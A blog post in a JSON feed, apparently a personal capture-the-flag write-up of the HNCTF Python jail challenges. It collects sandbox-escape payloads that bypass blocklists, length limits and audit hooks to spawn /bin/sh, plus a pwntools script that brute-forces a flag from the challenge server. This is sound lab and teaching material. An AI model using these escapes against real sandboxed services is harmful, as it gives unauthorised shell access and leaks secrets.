{
    "version": "https://jsonfeed.org/version/1",
    "title": "Moyao の小屋 • All posts by \"jail\" tag",
    "description": "Write down something interesting I met<br />\nFeel free to mail me if you have something wanted to talk about, plz\nmail: &lt;moyaoxue@outlook.com&gt;\n",
    "home_page_url": "https://demoyao100.github.io",
    "items": [
        {
            "id": "https://demoyao100.github.io/2022/11/01/pythonJail/",
            "url": "https://demoyao100.github.io/2022/11/01/pythonJail/",
            "title": "pythonJail",
            "date_published": "2022-11-01T07:48:11.000Z",
            "content_html": "<h4 id=\"preface\"><a class=\"anchor\" href=\"#preface\">#</a> preface</h4>\n<h6 id=\"thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail\"><a class=\"anchor\" href=\"#thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail\">#</a> Thanks to 空白 crazyman, who brough us so much excellent ctf exercises. (Though I didn't work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems<a href=\"https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/\">pythonJail</a>.</h6>\n<p><span id=\"more\"></span></p>\n<h3 id=\"level-1\"><a class=\"anchor\" href=\"#level-1\">#</a> LEVEL 1</h3>\n<p><img src=\"/2022/11/01/pythonJail/level1.png\" alt=\"level1\"></p>\n<p>From the function filter, we sees that the symbol [&quot; ' ` i b] is banned. Which means (Show subclasses with tuple)  <code> ().\\__class\\__.\\__base\\__.\\__subclasses\\__()</code></p>\n<p>is not allowed. What's more, symbol ' and &quot; is banned, so it come to us that we may can use  <code>chr</code>  to splicing a string that we wanted.</p>\n<p>Two possible payload:</p>\n<blockquote>\n<p>getattr(getattr(getattr(getattr(()._<em>class_</em>,c),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))<br>\n(().__class__.__base__.__subclasses__()[-4].__init__.__globals__<a href=\"'sh'\">'system'</a>)</p>\n</blockquote>\n<blockquote>\n<p>open(chr(102)+chr(108)+chr(97)+chr(103)).read()<br>\nfrom <a href=\"https://zhuanlan.zhihu.com/p/578986988\">thisBlog</a></p>\n</blockquote>\n<p><img src=\"/2022/11/01/pythonJail/level1wp.png\" alt=\"level1pos\"></p>\n<h3 id=\"level-2\"><a class=\"anchor\" href=\"#level-2\">#</a> LEVEL 2</h3>\n<p><img src=\"/2022/11/01/pythonJail/level2.png\" alt=\"level1\"></p>\n<p>The length of the payload is limited to 13.</p>\n<p>The answer according to 空白 is the function &lt;c style=&quot;color: #FF0000&quot;&gt;&quot;breakpoint ()&quot;&lt;/c&gt;, which I didn't figure out yet. However, there is another way. Use  <code>eval(input())</code>  so that the program receive once again for your input! Seems a little bit like  <code>/?cmd=system($_POST[1]);$1=ls</code>  to escape the filter in php right?</p>\n<h3 id=\"level-3\"><a class=\"anchor\" href=\"#level-3\">#</a> LEVEL 3</h3>\n<p><img src=\"/2022/11/01/pythonJail/level3.png\" alt=\"level3\"></p>\n<p>This time, the maximum length of our payload is down to 7.</p>\n<p>I didn't quite understand yet, but function  <code>help()</code>  can help you passby the 7 words limit. Here is when I tried others' payload, quite amazing and when I am available I shall come back to study it.</p>\n<blockquote></blockquote>\n<p><img src=\"/2022/11/01/pythonJail/level3wp.png\" alt=\"level3\"></p>\n<h3 id=\"python2-input-jail\"><a class=\"anchor\" href=\"#python2-input-jail\">#</a> PYTHON2 INPUT JAIL</h3>\n<p><img src=\"/2022/11/01/pythonJail/input(jail).png\" alt=\"input(jail)\"></p>\n<p>python2, another thing I am not familiar with...</p>\n<p>Looking up others' write up...</p>\n<p><img src=\"/2022/11/01/pythonJail/input(jail)wp.png\" alt=\"input(jail)\"></p>\n<h3 id=\"level-25\"><a class=\"anchor\" href=\"#level-25\">#</a> LEVEL 2.5</h3>\n<p><img src=\"/2022/11/01/pythonJail/level2.5.png\" alt=\"level2.5\"></p>\n<p>We can use  <code>breakpoint()</code>  to go into pdb, and rce is possible.</p>\n<h3 id=\"lake\"><a class=\"anchor\" href=\"#lake\">#</a> LAKE</h3>\n<p><img src=\"/2022/11/01/pythonJail/lake.png\" alt=\"lake\"></p>\n<h6 id=\"strange-christencrazyman-seems-to-name-it-lake-from-leak\"><a class=\"anchor\" href=\"#strange-christencrazyman-seems-to-name-it-lake-from-leak\">#</a> Strange christen.(Crazyman seems to name it 'lake' from 'leak'?)</h6>\n<p>Use  <code>globals()</code>  to leak the key. And then get shell.</p>\n<h3 id=\"lke\"><a class=\"anchor\" href=\"#lke\">#</a> L@KE</h3>\n<p><img src=\"/2022/11/01/pythonJail/l%40ke.png\" alt=\"l@ke\"></p>\n<h6 id=\"another-strange-christen\"><a class=\"anchor\" href=\"#another-strange-christen\">#</a> Another strange christen...</h6>\n<p>The maxinum length of payload is now 6, so only  <code>help()</code>  is possible.</p>\n<p>But unlike cases above, this time module 'os' is destory or whatever. Now we comes to the base reason why we use 'os' above.  <code>help()</code>  can actually get you into any module in the python file, which includes  <code>__main__</code> ! And surely, the key can be found inside.</p>\n<p>&lt;br&gt;</p>\n<h5 id=\"ok-now-weve-go-through-the-first-four-level-designed-by-crazyman-that-is-from-level-5-there-provides-no-source-code\"><a class=\"anchor\" href=\"#ok-now-weve-go-through-the-first-four-level-designed-by-crazyman-that-is-from-level-5-there-provides-no-source-code\">#</a> OK, now we've go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.</h5>\n<p>&lt;br&gt;</p>\n<h3 id=\"level-5\"><a class=\"anchor\" href=\"#level-5\">#</a> LEVEL 5</h3>\n<p><img src=\"/2022/11/01/pythonJail/level5.png\" alt=\"level5\"></p>\n<p>Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out.</p>\n<h3 id=\"level-4\"><a class=\"anchor\" href=\"#level-4\">#</a> LEVEL 4</h3>\n<h6 id=\"why-is-it-4-after-5-i-dont-know\"><a class=\"anchor\" href=\"#why-is-it-4-after-5-i-dont-know\">#</a> (Why is it 4 after 5 I don't know...)</h6>\n<p>4 bytes rce, seems impossible, so lets just guass it use  <code>os.system(input_data)</code>  to get your input and bingo.</p>\n<p><img src=\"/2022/11/01/pythonJail/level4.png\" alt=\"level4\"></p>\n<h3 id=\"lake-2\"><a class=\"anchor\" href=\"#lake-2\">#</a> LAkE</h3>\n<p><img src=\"/2022/11/01/pythonJail/laKelaKe.png\" alt=\"laKe\"></p>\n<p>This time it imports  <code>sys</code>  module with <a href=\"https://peps.python.org/pep-0578/\">audit hook</a>, and direct RCE function like  <code>pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen</code>  is not available. Whats more,  <code>compile、eval、exec、open</code>  is unfetchable. However, there use  <code>random.setstate()</code>  to generate its random number, which is base on Mersenne <a href=\"https://zh.wikipedia.org/zh-tw/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95\">Twister</a>, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one 'eval' in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?</p>\n<p>First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with  <code>lambda</code> . Some case can be view below:</p>\n<pre><code>https://ctftime.org/writeup/21982\n\nhttps://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#operators-and-short-tricks\n</code></pre>\n<p>Second, if we  <code>import random</code>  and print  <code>random.getstate</code>  at the beginning, we got a tuple back. which may look like: <code>(3, (..., 624), None)</code> . The first value '3' and the last value 'None' is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number.</p>\n<h5 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> payload:</h5>\n<pre><code>[random:=\\_\\_import__('random'), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]\n</code></pre>\n<h3 id=\"level-51\"><a class=\"anchor\" href=\"#level-51\">#</a> LEVEL 5.1</h3>\n<p>Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1.</p>\n<p><code>nc</code>  and  <code>dir()</code> (as it tells you to), found  <code>my_flag</code> , try  <code>list(getattr(my_flag,'flag))</code> , got a  <code>AttributeError: 'flag_level5' object has no attribute 'flag'</code> . So payload is  <code>list(getattr(my_flag,'flag_level5'))</code></p>\n<p>Another way to solve this problem(though quite similar, the latter gets its shell)</p>\n<p><img src=\"/2022/11/01/pythonJail/level5.1_1.png\" alt=\"level5.1_1\"><br>\n<img src=\"/2022/11/01/pythonJail/level5.1_2.png\" alt=\"level5.1_2\"></p>\n<h3 id=\"lak3\"><a class=\"anchor\" href=\"#lak3\">#</a> LAK3</h3>\n<p><img src=\"/2022/11/01/pythonJail/lak3.png\" alt=\"lak3\"></p>\n<p>Same as before, we can use the excate same payload. Though the official payload provides by crazyman is  <code>__import__('sys')._getframe(1).f_locals['right_guesser_question_answer']</code></p>\n<h5 id=\"a-good-blog-can-refer\"><a class=\"anchor\" href=\"#a-good-blog-can-refer\">#</a> <a href=\"https://ctftime.org/writeup/21982\">a good blog can refer</a></h5>\n<h3 id=\"type-chnnel\"><a class=\"anchor\" href=\"#type-chnnel\">#</a> tyPe Ch@nnEl</h3>\n<p><img src=\"/2022/11/01/pythonJail/sideChannel.png\" alt=\"sideChannel\"></p>\n<p>I haven't quite understand yet. So I will put the payload beforehand:</p>\n<p>One possible:</p>\n<pre><code>from pwn import *\nfrom tqdm import trange\n\nclass Gao:\n    def __init__(self):\n        self.known = ''\n\ndef init(self):\n    # self.conn = process(['python3', './server_type.py'])\n    self.conn = remote('1.14.71.254', 28563)\n\ndef gao(self):\n    payload = '((1)if(type(flag.split())(flag.encode()).pop(&#123;pos&#125;)^&#123;val&#125;)else(True))'\n    i = len(self.known)\n    while True:\n        for j in trange(32, 128):\n            cur_payload = payload.format(pos=i, val=j)\n            self.init()\n            self.conn.sendlineafter('Payload:', cur_payload)\n            s = self.conn.recvline()\n            self.conn.close()\n            if (b'Try' in s):\n                return\n            elif (b'bool' in s):\n                self.known += chr(j)\n                print(self.known)\n                print(self.known)\n                print(self.known)\n                break\n        else:\n            raise Exception('GG simida')            \n        i += 1\nif __name__ == '__main__':\n    g = Gao()\n    g.gao()\n</code></pre>\n<p>↑ Can took some time(when I tried)</p>\n<p>Officail:</p>\n<pre><code>for i in range(len(flag), len(flag)+100): # flag length\nfor guess in chars: # all possible chars\n    print(&quot;guess: &quot;, bytes(flag), chr(guess))\n    payload = f&quot;type(type(flag).mro())(type(type(flag).mro())(flag).pop(&#123;i&#125;).encode()).remove(&#123;guess&#125;)&quot;\n</code></pre>\n<h3 id=\"level-4-2\"><a class=\"anchor\" href=\"#level-4-2\">#</a> LEVEL 4</h3>\n<h6 id=\"level-4-again\"><a class=\"anchor\" href=\"#level-4-again\">#</a> level 4 again</h6>\n<p><img src=\"/2022/11/01/pythonJail/level4_1.png\" alt=\"level4_1\"></p>\n<p>Quite similar as before, just use  <code>bytes().decode()</code>  to pass the black list.</p>\n<p><img src=\"/2022/11/01/pythonJail/level4wp1.png\" alt=\"level4_1wp1\"><br>\n<img src=\"/2022/11/01/pythonJail/level4wp2.png\" alt=\"level4_1wp2\"></p>\n<p>payload:</p>\n<pre><code>().__class__.__base__.__subclasses__()\n</code></pre>\n<h5 id><a class=\"anchor\" href=\"#\">#</a> </h5>\n<p>​    ().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[-4].<strong>init</strong>.<strong>globals</strong>[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())</p>\n<p>There is another solution to this problem: I am not sure I fully understand it, so I put a <a href=\"https://zhuanlan.zhihu.com/p/579057932\">link</a> here beforehand.</p>\n<h5 id=\"payload-2\"><a class=\"anchor\" href=\"#payload-2\">#</a> payload:</h5>\n<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])\n</code></pre>\n<p><img src=\"/2022/11/01/pythonJail/level4wp_3.png\" alt=\"level4wp3\"></p>\n<h3 id=\"level-405\"><a class=\"anchor\" href=\"#level-405\">#</a> LEVEL 4.0.5</h3>\n<p>Same payload as last one.</p>\n<p><img src=\"/2022/11/01/pythonJail/level4.0.5.png\" alt=\"level4.0.5\"></p>\n<h3 id=\"level-41\"><a class=\"anchor\" href=\"#level-41\">#</a> LEVEL 4.1</h3>\n<p>Quite same as before.</p>\n<p><img src=\"/2022/11/01/pythonJail/level4.1wp1.png\" alt=\"level4.1\"></p>\n<p>Ps, the  <code>bytes</code>  is now banned, but still you can use  <code>show subclassed with tuples</code>  to replace, like this:</p>\n<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())\n</code></pre>\n<h3 id=\"level-42\"><a class=\"anchor\" href=\"#level-42\">#</a> LEVEL 4.2</h3>\n<p>Quite same as before..</p>\n<p><img src=\"/2022/11/01/pythonJail/level4.2wp.png\" alt=\"level4.2\"></p>\n<h5 id=\"or-rather-use-join\"><a class=\"anchor\" href=\"#or-rather-use-join\">#</a> Or rather use  <code>join</code> :</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__base__<span class=\"token punctuation\">.</span>__subclasses__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">.</span>__globals__<span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__doc__<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__doc__<span class=\"token punctuation\">[</span><span class=\"token number\">86</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__doc__<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__doc__<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__doc__<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__doc__<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__doc__<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__doc__<span class=\"token punctuation\">[</span><span class=\"token number\">56</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"level-43\"><a class=\"anchor\" href=\"#level-43\">#</a> LEVEL 4.3</h3>\n<p>Quite same as before...</p>\n<p><img src=\"/2022/11/01/pythonJail/level4.3wp.png\" alt=\"level4.3\"></p>\n<p>&lt;br&gt;</p>\n<h5 id=\"the-next-few-levels-are-become-harder-and-harder\"><a class=\"anchor\" href=\"#the-next-few-levels-are-become-harder-and-harder\">#</a> The next few levels are become harder and harder.</h5>\n<p>&lt;br&gt;</p>\n<h3 id=\"level-6\"><a class=\"anchor\" href=\"#level-6\">#</a> LEVEL 6</h3>\n<h4 id=\"repetition\"><a class=\"anchor\" href=\"#repetition\">#</a> repetition:</h4>\n<p><img src=\"/2022/11/01/pythonJail/level6wp1.png\" alt=\"level6wp1\"><br>\n<img src=\"/2022/11/01/pythonJail/level6wp2.png\" alt=\"level6wp2\"><br>\n<img src=\"/2022/11/01/pythonJail/level6wp3.png\" alt=\"level6wp3\"></p>\n<h5 id=\"link-that-may-help-you\"><a class=\"anchor\" href=\"#link-that-may-help-you\">#</a> <a href=\"https://ctftime.org/writeup/31883\">link that may help you</a></h5>\n<p>The basic idea is to RCE with  <code>_posixsubprocess.fork_exec</code> . If we import it directly, it will trigger the audit hook. But we can pass it by using  <code>__builtins__['__loader__'].load_module('_posixsubprocess')</code>  or  <code>__loader__.load_module('_posixsubprocess')</code> . Also, due to its repeatedly exct, we just shell like this:</p>\n<pre><code>import os\n__loader__.load_module('_posixsubprocess').fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)\n</code></pre>\n<h3 id=\"level-61\"><a class=\"anchor\" href=\"#level-61\">#</a> LEVEL 6.1</h3>\n<p>This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works.</p>\n<p><img src=\"/2022/11/01/pythonJail/level6.1wp.png\" alt=\"level6.1wp\"></p>\n<h5 id=\"payload-3\"><a class=\"anchor\" href=\"#payload-3\">#</a> payload:</h5>\n<pre><code>[os := __import__('os'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in range(100000)]]\n</code></pre>\n<h5 id=\"or\"><a class=\"anchor\" href=\"#or\">#</a> or</h5>\n<pre><code>[os := __import__('os'), itertools := __loader__.load_module('itertools'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]\n</code></pre>\n<h3 id=\"safeeval\"><a class=\"anchor\" href=\"#safeeval\">#</a> SAFEEVAL</h3>\n<p>Use lambda to wrap up RCE</p>\n<p>payload:</p>\n<pre><code>(lambda: __import__('os').system('sh'))()\n</code></pre>\n<p><img src=\"/2022/11/01/pythonJail/safeeval_1.png\" alt=\"safeeval\"><br>\n<img src=\"/2022/11/01/pythonJail/safeeval_2.png\" alt=\"safeeval\"></p>\n<h3 id=\"level7\"><a class=\"anchor\" href=\"#level7\">#</a> LEVEL7</h3>\n<h6 id=\"come-back-later-to-try-to-figure-it-out\"><a class=\"anchor\" href=\"#come-back-later-to-try-to-figure-it-out\">#</a> Come back later to try to figure it out...</h6>\n<p>payload:</p>\n<blockquote>\n<p>@exec<br>\n@input<br>\nclass X: pass</p>\n</blockquote>\n<blockquote>\n<p><strong>import</strong>('os').system('sh')</p>\n</blockquote>\n<h5 id=\"blog\"><a class=\"anchor\" href=\"#blog\">#</a> <a href=\"https://gynvael.coldwind.pl/n/python_sandbox_escape\">blog</a></h5>\n<pre><code>↑# [organizers] Robin_Jadoul solution↑\n</code></pre>\n<p><img src=\"/2022/11/01/pythonJail/level7wp1.png\" alt=\"level7\"><br>\n<img src=\"/2022/11/01/pythonJail/level7wp2.png\" alt=\"level7\"></p>\n<h3 id=\"ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail\"><a class=\"anchor\" href=\"#ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail\">#</a> Ok, so that's the end of the hnctf. There are some thing that may help you get further about pyjail:</h3>\n<pre><code>https://gynvael.coldwind.pl/n/python_sandbox_escape\n\nhttps://www.youtube.com/watch?v=Ub_BMOMDOx0\n\nhttps://zhuanlan.zhihu.com/p/578966149\n</code></pre>\n",
            "tags": [
                "jail"
            ]
        }
    ]
}